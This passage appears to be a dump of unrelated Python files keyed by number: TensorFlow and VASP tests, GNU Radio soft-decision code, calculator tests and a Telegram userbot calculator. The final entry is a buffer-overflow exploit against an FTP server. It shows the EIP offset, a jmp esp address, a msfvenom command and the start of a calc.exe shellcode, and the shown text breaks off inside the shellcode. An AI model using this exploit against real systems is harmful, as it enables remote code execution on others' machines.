tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "118": "import os\nimport pytest\n\ncalc = pytest.mark.calculator\n\n\n@pytest.mark.filterwarnings('ignore:Specifying directory')\n@calc('vasp')\ndef test_vasp_wdir(factory, atoms_co):\n    \"\"\"Run tests to ensure that the VASP txt and label arguments function\n    correctly, i.e. correctly sets the working directories and works\n    in that directory.\n\n    This is conditional on the existence of the ASE_VASP_COMMAND,\n    VASP_COMMAND or VASP_SCRIPT environment variables\"\"\"\n\n    def compare_paths(path1, path2):\n        assert os.path.abspath(path1) == os.path.abspath(path2)\n\n    atoms = atoms_co  # Aliasing\n\n    file1 = '_vasp_dummy_str.out'\n    file2 = '_vasp_dummy_io.out'\n    file3 = '_vasp_dummy_2.out'\n\n    testdir = '_dummy_txt_testdir'\n    label = os.path.join(testdir, 'vasp')\n\n    # Test\n    settings = dict(label=label,\n                    xc='PBE',\n                    prec='Low',\n                    algo='Fast',\n                    ismear=0,\n                    sigma=1.,\n                    istart=0,\n                    lwave=False,\n                    lcharg=False)\n\n    # Make 2 copies of the calculator object\n    calc = factory.calc(**settings)\n    calc2 = factory.calc(**settings)\n\n    # Check the calculator path is the expected path\n    compare_paths(calc.directory, testdir)\n\n    calc.set(txt=file1)\n    atoms.calc = calc\n    en1 = atoms.get_potential_energy()\n\n    # Check that the output files are in the correct directory\n    for fi in ['OUTCAR', 'CONTCAR', 'vasprun.xml']:\n        fi = os.path.join(testdir, fi)\n        assert os.path.isfile(fi)\n\n    # We open file2 in our current directory, so we don't want it to write\n    # in the label directory\n    with open(file2, 'w') as fd:\n        calc2.set(txt=fd)\n        atoms.calc = calc2\n        atoms.get_potential_energy()\n\n    # Test restarting from working directory in test directory\n    label2 = os.path.join(testdir, file3)\n    calc2 = factory.calc(restart=label, label=label2)\n\n    # Check the calculator path is the expected path\n    compare_paths(calc2.directory, testdir)\n\n    assert not calc2.calculation_required(calc2.atoms, ['energy', 'forces'])\n    en2 = calc2.get_potential_energy()\n\n    # Check that the restarted calculation didn't run, i.e. write to output file\n    assert not os.path.isfile(os.path.join(calc.directory, file3))\n\n    # Check that we loaded energy correctly\n    assert en1 == en2\n", "119": "#!/usr/bin/env python\n#\n# Copyright 2013 Free Software Foundation, Inc.\n# \n# This file is part of GNU Radio\n# \n# GNU Radio is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 3, or (at your option)\n# any later version.\n# \n# GNU Radio is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n# \n# You should have received a copy of the GNU General Public License\n# along with GNU Radio; see the file COPYING.  If not, write to\n# the Free Software Foundation, Inc., 51 Franklin Street,\n# Boston, MA 02110-1301, USA.\n# \n\nimport numpy, pylab, sys\nfrom gnuradio import digital\nfrom soft_dec_lut_gen import *\nfrom psk_constellations import *\nfrom qam_constellations import *\n\ndef test_qpsk(i, sample, prec):\n    qpsk_const_list = [psk_4_0, psk_4_1, psk_4_2, psk_4_3,\n                       psk_4_4, psk_4_5, psk_4_6, psk_4_7]\n    qpsk_lut_gen_list = [sd_psk_4_0, sd_psk_4_1, sd_psk_4_2, sd_psk_4_3,\n                         sd_psk_4_4, sd_psk_4_5, sd_psk_4_6, sd_psk_4_7]\n\n    constel, code = qpsk_const_list[i]()\n    qpsk_lut_gen = qpsk_lut_gen_list[i]\n\n    rot_sym = 1\n    side = 2\n    width = 2\n    c = digital.constellation_rect(constel, code, rot_sym,\n                                   side, side, width, width)\n\n    # Get max energy/symbol in constellation\n    constel = c.points()\n    Es = max([numpy.sqrt(constel_i.real**2 + constel_i.imag**2) for constel_i in constel])\n\n    #table = soft_dec_table_generator(qpsk_lut_gen, prec, Es)\n    table = soft_dec_table(constel, code, prec)\n\n    c.gen_soft_dec_lut(prec)\n    #c.set_soft_dec_lut(table, prec)\n\n    y_python_gen_calc = qpsk_lut_gen(sample, Es)\n    y_python_table = calc_soft_dec_from_table(sample, table, prec, Es)\n    y_python_raw_calc = calc_soft_dec(sample, constel, code)\n    y_cpp_table = c.soft_decision_maker(sample)\n    y_cpp_raw_calc = c.calc_soft_dec(sample)\n\n    return (y_python_gen_calc, y_python_table, y_python_raw_calc,\n            y_cpp_table, y_cpp_raw_calc, constel, code, c)\n\ndef test_qam16(i, sample, prec):\n    sample = sample/1\n    qam_const_list = [qam_16_0, ]\n    qam_lut_gen_list = [sd_qam_16_0, ]\n\n    constel, code = qam_const_list[i]()\n    qam_lut_gen = qam_lut_gen_list[i]\n\n    rot_sym = 4\n    side = 2\n    width = 2\n    c = digital.constellation_rect(constel, code, rot_sym,\n                                   side, side, width, width)\n\n    # Get max energy/symbol in constellation\n    constel = c.points()\n    Es = max([abs(constel_i) for constel_i in constel])\n\n    #table = soft_dec_table_generator(qam_lut_gen, prec, Es)\n    table = soft_dec_table(constel, code, prec, 1)\n\n    #c.gen_soft_dec_lut(prec)\n    c.set_soft_dec_lut(table, prec)\n\n    y_python_gen_calc = qam_lut_gen(sample, Es)\n    y_python_table = calc_soft_dec_from_table(sample, table, prec, Es)\n    y_python_raw_calc = calc_soft_dec(sample, constel, code, 1)\n    y_cpp_table = c.soft_decision_maker(sample)\n    y_cpp_raw_calc = c.calc_soft_dec(sample)\n\n    return (y_python_gen_calc, y_python_table, y_python_raw_calc,\n            y_cpp_table, y_cpp_raw_calc, constel, code, c)\n\nif __name__ == \"__main__\":\n\n    index = 0\n    prec = 8\n\n    x_re = 2*numpy.random.random()-1\n    x_im = 2*numpy.random.random()-1\n    x = x_re + x_im*1j\n    #x = -1 + -0.j\n\n    if 1:\n        y_python_gen_calc, y_python_table, y_python_raw_calc, \\\n            y_cpp_table, y_cpp_raw_calc, constel, code, c \\\n            = test_qpsk(index, x, prec)\n    else:\n        y_python_gen_calc, y_python_table, y_python_raw_calc, \\\n            y_cpp_table, y_cpp_raw_calc, constel, code, c \\\n            = test_qam16(index, x, prec)\n\n    k = numpy.log2(len(constel))\n\n    print \"Sample: \", x\n    print \"Python Generator Calculated: \", (y_python_gen_calc)\n    print \"Python Generator Table:      \", (y_python_table)\n    print \"Python Raw calc:             \", (y_python_raw_calc)\n    print \"C++ Table calc:              \", (y_cpp_table)\n    print \"C++ Raw calc:                \", (y_cpp_raw_calc)\n\n    fig = pylab.figure(1)\n    sp1 = fig.add_subplot(1,1,1)\n    sp1.plot([c.real for c in constel],\n             [c.imag for c in constel], 'bo')\n    sp1.plot(x.real, x.imag, 'ro')\n    sp1.set_xlim([-1.5, 1.5])\n    sp1.set_ylim([-1.5, 1.5])\n    fill = int(numpy.log2(len(constel)))\n    for i,c in enumerate(constel):\n        sp1.text(1.2*c.real, 1.2*c.imag, bin(code[i])[2:].zfill(fill),\n                 ha='center', va='center', size=18)\n    pylab.show()\n", "120": "import pytest\n\n\nclass TestAnswer:\n    @pytest.fixture(scope=\"module\")\n    def calc(self, loader):\n        return loader(\"precedencia.answer\").eval_calc\n\n    def test_exemplos_simples(self, calc):\n        assert calc(\"40 + 2\") == 42.0\n        assert calc(\"21 * 2\") == 42.0\n        assert calc(\"50 - 8\") == 42.0\n        assert calc(\"84 / 2\") == 42.0\n        assert calc(\"2 ^ 3\") == 8.0\n\n    def test_cadeias(self, calc):\n        assert calc(\"1 + 2 + 3 + 4\") == 10\n        assert calc(\"10 - 3 - 2 - 1\") == 4\n\n    def test_agrupamentos_com_parenteses(self, calc):\n        calc(\"2 * (3 + 4)\") == 14\n        calc(\"(42)\") == 42\n        calc(\"(21 + 21) * 2\") == 42\n\n    @pytest.mark.parametrize(\"op1,op2\", [(x, y) for x in \"+-*/^\" for y in \"+-*/^\"])\n    def test_todos_os_pares_de_operadores(self, op1, op2, calc):\n        src = f\"1.0 {op1} 2.0 {op2} 3.0\"\n        res = calc(src)\n        py = eval(src.replace(\"^\", \"**\"))\n\n        print(\"testing:\", src)\n        assert abs(res - py) <= 1e-9, f\"{src} => {res} (esperava {py})\"\n\n\nclass TestSubmission(TestAnswer):\n    @pytest.fixture(scope=\"module\")\n    def calc(self, loader):\n        return loader(\"precedencia\").eval_calc\n", "121": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "122": "# \u043d\u0430\u0441\u043b\u0435\u0434\u0438\u0435\n\nclass Parent(object):               # \u0438\u0434\u0435\u043d\u0442\u0438\u0447\u043d\u043e: Parent:         \u0420\u041e\u0414\u0418\u0422\u0415\u041b\u042c\u0421\u041a\u0418\u0419 \u041a\u041b\u0410\u0421\u0421\n    def __init__(self):             # \u0441\u0449\u0437\u0434\u0430\u0435\u043c \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u0432\n        print('Parent inited')\n        self.value = 'Parent'       # \u0438\u043c\u0435\u044e\u0449\u0438\u0445 \u0435\u0434\u0438\u043d\u0441\u0442\u0432\u0435\u043d\u043d\u0443\u044e \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0443\u044e Parent\n\n    def do(self):                    # \u043f\u0435\u0447\u0430\u0442\u0430\u0435\u043c \u0442\u0435\u043a\u0441\u0442 \u0441 \u044d\u0442\u043e\u0439 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439\n        print('Parent do(): {}'.format(self.value))\n\nparent = Parent()                    # \u0441\u043e\u0437\u0434\u0430\u0435\u043c  \u043e\u0431\u044a\u0435\u043a\u0442 \u043a\u043b\u0430\u0441\u0441\u0430 Parent(), \u0432 \u043d\u0435\u043c \u0435\u0434\u0438\u043d\u0441\u0442\u0432\u0435\u043d\u043d\u0430\u044f \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f Parent\nparent.do()                          # \u0432\u044b\u043f\u043e\u043b\u043d\u044f\u0435\u043c \u0441 \u044d\u0442\u0438\u043c \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u043c \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f \u043c\u0435\u0442\u043e\u0434\u043e\u043c .do(self)\n# resulr: Parent inited\n#         Parent do(): Parent\n\nclass Child(Parent):                 # \u041a\u041e\u041d\u0421\u0422\u0420\u0423\u041a\u0422\u041e\u0420 \u041d\u0410\u0421\u041b\u0415\u0414\u041d\u0418\u041a\u0410\n    def __init__(self):\n        print('Child inited')\n        self.value = 'Child'\n\nchild = Child()                      # \u043f\u0440\u0438\u0441\u0432\u0430\u0438\u0432\u0430\u0435\u043c \u043e\u0431\u044a\u0435\u043a\u0442 \u043d\u0430\u0441\u043b\u0435\u0434\u043d\u0438\u043a\u0443\nprint(child)\n# result: Child inited\n#         \nchild.do()                           # \u0432\u044b\u043f\u043e\u043b\u043d\u044f\u0435\u043c \u0441 \u044d\u0442\u0438\u043c \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u043c \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f \u043c\u0435\u0442\u043e\u0434\u043e\u043c .do(self) \u0420\u041e\u0414\u0418\u0422\u0415\u041b\u042f\n# result: Parent do(): Child\n# -------------------------------------------------------------------------------------------------------\n\nclass Calc(object):                   # \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0440\u043e\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u043a\u0438\u0439 \u043a\u043b\u0430\u0441\u0441\n    def __init__(self, number):\n        self.number = number          # \u0441\u0449\u0437\u0434\u0430\u0435\u043c \u043e\u0431\u044a\u0435\u043a\u0442 \u0441 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 number\n    def calc_and_print(self):\n        value = self.calc_value()     # \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044f value \u043f\u0440\u0438\u043d\u0438\u043c\u0430\u0435\u0442 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u043c\u0435\u0442\u043e\u0434\u0430 calc_value\n        self.print_number(value)      # \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f value \u043f\u0435\u0440\u0435\u0434\u0430\u0435\u0442\u0441\u044f \u043c\u0435\u0442\u043e\u0434\u0443 print_number\n    def calc_value(self):\n        return self.number * 10 + 2                 # \u0441\u0447\u0438\u0442\u0430\u0435\u043c \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0443\u044e value\n    def print_number(self, value_to_print):\n        print('-----')\n        print('Number is', value_to_print)          # \u043f\u0435\u0447\u0430\u0442\u0430\u0435\u043c \u0432\u0441\u0435 \u0441 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 value\n        print('-----')\nc = Calc(3)\nc.calc_and_print()\n# result: -----\n#         Number is 32\n#         -----\n\nclass CalcExtraValue(Calc):                           #  \u0421\u0449\u0437\u0434\u0430\u0435\u043c \u043a\u043b\u0430\u0441\u0441 \u043d\u0430\u0441\u043b\u0435\u0434\u043d\u0438\u043a.\n    def calc_value(self):\n        return self.number -100                       # \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0443\u044e number - 100\n\nc = CalcExtraValue(3)\nc.calc_and_print()                                     # \u0432\u044b\u0437\u044b\u0432\u0430\u0435\u043c \u043c\u0435\u0442\u043e\u0434 calc_and_print \u0440\u043e\u0434\u0438\u0442\u0435\u043b\u044f\n# result: -----\n#         Number is -97\n#         -----\n# ---------------------------------------------------------------------------------------\n# super()  - \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u044c \u0432\u044b\u0437\u044b\u0432\u0430\u0442\u044c \u0440\u043e\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u043a\u0438\u0439 \u043c\u0435\u0442\u043e\u0434\n\nclass Calc(object):\n    def __init__(self, value):                     # \u0440\u043e\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u043a\u0438\u0439 \u043c\u0435\u0442\u043e\u0434\n        print('Calc constructor is called')\n        self.value = value                         # \u043d\u0430\u0437\u044b\u0432\u0430\u0435\u043c \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0443\u044e value\n\n    def count(self):\n        return self.value * 8 + 9                   # \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0443\u044e \u0441 \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u044b\u043c\u0438 \u0430\u0440. \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f\u043c\u0438\n\nc = Calc(1.4)\nprint(c.count())\n\nclass ExtendedCalc(Calc):                           # \u043a\u043b\u0430\u0441\u0441 \u043d\u0430\u0441\u043b\u0435\u0434\u043d\u0438\u043a\u0430\n    def __init__(self, value, k = 1):\n        super(). __init__(value)                    # \u0432\u044b\u0437\u044b\u0432\u0430\u0435\u043c \u0440\u043e\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u043a\u0438\u0439 \u043c\u0435\u043e\u0434 __init__ \u0441 \u043f\u043e\u043c\u043e\u0449\u044c\u044e super\n        print('Extender', self.value)               # \u043f\u0435\u0447\u0430\u0442\u0430\u0435\u043c \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0443\u044e value \u0432 \u0434\u0430\u043d\u043d\u043e\u043c \u0441\u043b\u0443\u0447\u0430\u0435 \u0438\u0437 \u0440\u043e\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u043a\u043e\u0433\u043e \u043a\u043b\u0430\u0441\u0441\u0430\n\n        self.k = k\n\n    def count (self):\n        print('Before')\n        previous = super().count()                  # \u043d\u0430\u0437\u043d\u0430\u0447\u0430\u0435\u043c \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0443\u044e \u0447\u0435\u0440\u0435\u0437 \u0440\u043e\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u0438\u0439 \u043c\u0435\u0442\u043e\u0434 cout\n\n        return -1 * self.k * previous                # \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\n\ne = ExtendedCalc(8, k = 1.2)\nprint(e.count())\n\n# ------------------------------------------------------------------------\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", "123": "# Topics: two classes\n\nimport unittest\nfrom unit_testing_02.calculator_v3 import Calculator\n\n\nclass TestsCalculatorBaseFunctionality(unittest.TestCase):\n    def test_add(self):\n        calc = Calculator(10, 20)\n        result = calc.calc_add()\n        self.assertEqual(result, 30)\n\n    def test_diff(self):\n        calc = Calculator(100, 20)\n        result = calc.calc_diff()\n        self.assertEqual(result, 80)\n\n    def test_prod(self):\n        calc = Calculator(10, 20)\n        result = calc.calc_prod()\n        self.assertEqual(result, 200)\n\n\nclass TestsCalculatorAddFunctionality(unittest.TestCase):\n    def test_add_two_positive_numbers(self):\n        calc = Calculator(10, 20)\n        result = calc.calc_add()\n        self.assertEqual(result, 30)\n\n    def test_add_one_positive_number_and_one_negative(self):\n        calc = Calculator(50, -90)\n        result = calc.calc_add()\n        self.assertEqual(result, -40)\n\n    def test_add_two_negative_numbers(self):\n        calc = Calculator(-10, -20)\n        result = calc.calc_add()\n        self.assertEqual(result, -30)\n\n    def test_add_two_positive_decimal_numbers(self):\n        calc = Calculator(10.55, 20.97)\n        result = calc.calc_add()\n        self.assertEqual(result, 31.52)\n", "124": "import math\n\n\ndef calculate(prompt):\n    \"\"\"\n    Checks if the input prompt contains certain keywords then\n    performs mathematical functions on the input string.\n    The string must follow certain rules for each equation listed below:\n        addition: command - 'calculate number plus number' or\n                            'calculate number add number'\n        subtraction: command - 'calculate number minus number' or\n                            'calculate number subtract number' or\n                            'calculate number subtracted by number'\n        multiplication: command - 'calculate number times number' or\n                                'calculate number multiplied by number'\n        division: command - 'calculate number divided by number' or\n                            'calculate number multiplied by number'\n        exponential: command - 'calculate number to the power of number' or\n                                'calculate number to the power number' or\n                                'calculate number power number'\n        square root: command - 'calculate the square root of number'\n        factorial: command - 'calculate number factorial'\n        logarithmic: command - 'calculate log base number of number'\n    :param prompt:\n    :return: a tuple of the result and the formula\n    \"\"\"\n    if 'add' in prompt:\n        \"\"\"Splits the command at 'add' then adds the 2 numbers from the prompt: 'calculate number add number'\"\"\"\n        calc_prompt = prompt.split('add')\n        result = round(float(calc_prompt[0]) + float(calc_prompt[1]), 2)\n        return (result, prompt)\n\n    if '+' in prompt:\n        \"\"\"Splits the command at '+' then adds the 2 numbers from the prompt: 'calculate number plus number'\"\"\"\n        calc_prompt = prompt.split('+')\n        result = round(float(calc_prompt[0]) + float(calc_prompt[1]), 2)\n        return (result, prompt)\n\n    if '-' in prompt:\n        \"\"\"Splits the command at '-' then subtracts the 2nd number from the 1st from the prompt: 'calculate number minus number'\"\"\"\n        calc_prompt = prompt.split('-')\n        prompt = prompt.replace('-', 'minus')\n        result = round(float(calc_prompt[0]) - float(calc_prompt[1]), 2)\n        return (result, prompt)\n\n    if 'subtract' in prompt:\n        \"\"\"Splits the command at 'subtract' then subtracts the 2nd number from the 1st from the prompt: 'calculate number subtract number'\"\"\"\n        calc_prompt = prompt.split('subtract')\n        prompt = prompt.replace('subtract', 'minus')\n        result = round(float(calc_prompt[0]) - float(calc_prompt[1]), 2)\n        return (result, prompt)\n\n    if 'subtracted by' in prompt:\n        \"\"\"Splits the command at 'subtracted by' then subtracts the 2nd number from the 1st from the prompt: 'calculate number subtracted by number'\"\"\"\n        calc_prompt = prompt.split('subtracted by')\n        prompt = prompt.replace('subtracted by', 'minus')\n        result = round(float(calc_prompt[0]) - float(calc_prompt[1]), 2)\n        return (result, prompt)\n\n    if 'times' in prompt:\n        \"\"\"Splits the command at 'times' then multiplied the 2 numbers from the prompt: 'calculate number times number'\"\"\"\n        calc_prompt = prompt.split('times')\n        result = round(float(calc_prompt[0]) * float(calc_prompt[1]), 2)\n        return (result, prompt)\n\n    if 'multiplied by' in prompt:\n        \"\"\"Splits the command at 'multiplied by' then multiplies the 2 numbers from the prompt: 'calculate number multiplied by number'\"\"\"\n        calc_prompt = prompt.split('multiplied by')\n        result = round(float(calc_prompt[0]) * float(calc_prompt[1]), 2)\n        return (result, prompt)\n\n    if '*' in prompt:\n        \"\"\"Splits the command at '*' then multiplies the 2 numbers from the prompt: 'calculate number times number'\"\"\"\n        calc_prompt = prompt.split('*')\n        prompt = prompt.replace('*', 'times')\n        result = round(float(calc_prompt[0]) * float(calc_prompt[1]), 2)\n        return (result, prompt)\n\n    if '/' in prompt:\n        \"\"\"Splits the command at '/' then divides the 1st number by the 2nd number from the prompt: 'calculate number divided by number'\"\"\"\n        calc_prompt = prompt.split('/')\n        prompt = prompt.replace('/', 'divided by')\n        result = round(float(calc_prompt[0]) / float(calc_prompt[1]), 2)\n        return (result, prompt)\n\n    if 'divided by' in prompt:\n        \"\"\"Splits the command at 'divided by' then divides the 1st number by the 2nd number from the prompt: 'calculate number divided by number'\"\"\"\n        calc_prompt = prompt.split('divided by')\n        result = round(float(calc_prompt[0]) / float(calc_prompt[1]), 2)\n        return (result, prompt)\n\n    if 'to the power of' in prompt:\n        \"\"\"Splits the command at 'to the power of' then takes the 1st number to the power of the 2nd number from the prompt: 'calculate number to the power of number'\"\"\"\n        calc_prompt = prompt.split('to the power of')\n        result = round(float(calc_prompt[0]) ** float(calc_prompt[1]), 2)\n        return (result, prompt)\n\n    if 'to the power' in prompt:\n        \"\"\"Splits the command at 'to the power' then takes the 1st number to the power of the 2nd number from the prompt: 'calculate number to the power number'\"\"\"\n        calc_prompt = prompt.split('to the power')\n        prompt = prompt.replace('to the power', 'to the power of')\n        result = round(float(calc_prompt[0]) ** float(calc_prompt[1]), 2)\n        return (result, prompt)\n\n    if 'power' in prompt:\n        \"\"\"Splits the command at 'power' then takes the 1st number to the power of the 2nd number from the prompt: 'calculate number power number'\"\"\"\n        calc_prompt = prompt.split('power')\n        prompt = prompt.replace('power', 'to the power of')\n        result = round(float(calc_prompt[0]) ** float(calc_prompt[1]), 2)\n        return (result, prompt)\n\n    if '^' in prompt:\n        \"\"\"Splits the command at '^' then takes the 1st number to the power of the 2nd number from the prompt: 'calculate number to the power of number'\"\"\"\n        calc_prompt = prompt.split('^')\n        prompt = prompt.replace('^', 'to the power of')\n        result = round(float(calc_prompt[0]) ** float(calc_prompt[1]), 2)\n        return (result, prompt)\n\n    if 'the square root of' in prompt:\n        \"\"\"Remove 'the square root of' from the command then takes the square root of the number from the prompt: 'calculate the square root of number'\"\"\"\n        calc_prompt = prompt.replace('the square root of', '')\n        result = round(math.sqrt(float(calc_prompt)), 2)\n        return (result, prompt)\n\n    if 'factorial' in prompt:\n        \"\"\"Removes 'factorial' from the command then takes the factorial of the number from the prompt: 'calculate number factorial'\"\"\"\n        calc_prompt = prompt.replace('factorial', '')\n        result = round(math.factorial(float(calc_prompt)), 2)\n        return (result, prompt)\n\n    if 'log base' in prompt:\n        \"\"\"Removes 'log base' and 'of' from the command then takes the log base(1st number) of the 2nd number  from the prompt: 'calculate number factorial'\"\"\"\n        calc_prompt = prompt.replace(' log base ', '').replace(' of', '')\n        calc_prompt = calc_prompt.split(' ')\n        print('calc_prompt:', calc_prompt)\n        result = round(math.log(float(calc_prompt[1]), float(calc_prompt[0])), 2)\n        return (result, prompt)\n", "125": "#!/usr/bin/env python2\n\nimport socket\nimport struct\n\n# overflow is in user field and kicks off at a size of 1000\n# OFFSETS\n# EIP 251\n# EXP 263\n\n# jmp esp in ntll.dll at 0x77ace871\n\nRHOST = \"10.10.10.2\"\nRPORT = 21\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((RHOST, RPORT))\n\n# msfvenom -p windows/exec CMD=calc.exe -a x86 -f python --var-name shellcode_calc -b \"\\x00\\x0A\\x0D\" EXIT_FUNC=thread\n\nshellcode_calc =  b\"\"\nshellcode_calc += b\"\\xdd\\xc1\\xd9\\x74\\x24\\xf4\\xba\\xd9\\x74\\x74\"\nshellcode_calc += b\"\\x31\\x5e\\x2b\\xc9\\xb1\\x31\\x31\\x56\\x18\\x83\"\nshellcode_calc += 